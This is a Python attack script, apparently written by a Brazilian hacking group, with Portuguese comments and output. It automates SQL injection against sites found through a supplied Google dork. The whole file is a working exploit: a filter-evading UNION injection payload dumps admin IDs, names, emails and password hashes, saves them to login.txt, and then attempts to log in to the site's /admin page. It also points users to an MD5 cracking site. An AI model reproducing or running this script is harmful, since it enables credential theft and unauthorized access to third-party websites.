#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Desenvolvido por Adriel Freud!
# Contato: businessc0rp2k17@gmail.com
# FB: http://www.facebook.com/xrn401
#   =>DebutySecTeamSecurity<=

import requests, sys
from bs4 import BeautifulSoup

PATH = r"""/page.php?id='/*!50000Union*/ Select 1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=/*!50000CONCAT*/(0x20,@x,id,0x3a,fullname,0x3a,email,0x3a,password,0x3c62723e))))x),5,6,7,8,9,10,11,12,13-- -"""
header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'}
lista = [' ',',', r'\n']

menu = """
   _____       _    ____                        
  / ____|     | |  / __ \                       
 | (___   __._| | | |  | | _   _  ___ _ __ _   _ 
  \___ \ / _  | | | |  | || | | |/ _ \ '__| | | |
  ____) | (_| | | | |__| || |_| |  __/ |  | |_| |
 |_____/ \__  |_|  \___\_\ \__,_|\___|_|   \__, |
            | |                            __/ |
            |_|                           |___/ 

Powered By Adriel Freud..\n\n"""


def brute_login(data_login, url, menu):
	cover = url[len(url)-1]

	if cover == '/':
		r = requests.get("http://%sadmin"%url, auth=(data_login[2], raw_input("Hash Breaked: ")))
	else:
		r = requests.get("http://%s/admin"%url, auth=(data_login[2], raw_input("Hash Breaked: ")))

	if r.status_code == 200:
		print(menu)
		print("[+] Quebrem suas hashs em: http://md5online.org/\n[!] Logado com Sucesso!\n[+] Site: %s/admin\n\t[Logue com as Credenciais no arquivo login.txt]"%url)
	else:
		print(menu)
		print("[+] Quebrem suas hashs em: http://md5online.org/\n[!] Falha ao Logar!\n")


def query(new_url, header, menu, caracters, url):
	try:
		request = requests.get(new_url, headers=header)
	except:
		print(menu)
		print("Failed To Requests! :c\n")
	if request.status_code == 200:
		html = request.text
		bs = BeautifulSoup(html, 'lxml')
		h4find = bs.find('h4')
		text_clear = h4find.get_text()
		for words in caracters:
			text_clear = text_clear.replace(words, '')

		data_login = text_clear.split(':')
		data_login_splited = data_login[3].split('\n')


		print("%s[==>] Data Lenght: %s\n\n"%(menu, len(text_clear)))
		print("ID: %s\nLogin: %s\nPassword: %s\nFullname: %s\n"%(data_login[0], data_login[2], data_login_splited[0], data_login[1]))

		with open('login.txt', 'w') as w:
			w.write("ID: %s\nLogin: %s\nPassword: %s\nFullname: %s\nUrl-Admin: %s\n\n\t"%(data_login[0], data_login[2], data_login_splited[0], data_login[1], url+"/admin"))
			w.close()

		brute_login(data_login, url, menu)

	else:
		print(menu)
		print('Error ao connectar e Enviar a Query >:c')

if len(sys.argv) < 2:
	print(menu)
	print('Dork: intext:"Technical Assistance explore IT"  *id=')
	print("Modo de Uso: root@localhost~# python sql_logger.py")
else:
	url = sys.argv[1].split('/')[2]
	new_url = 'http://'+url+PATH
	query(new_url, header, menu, lista, url)

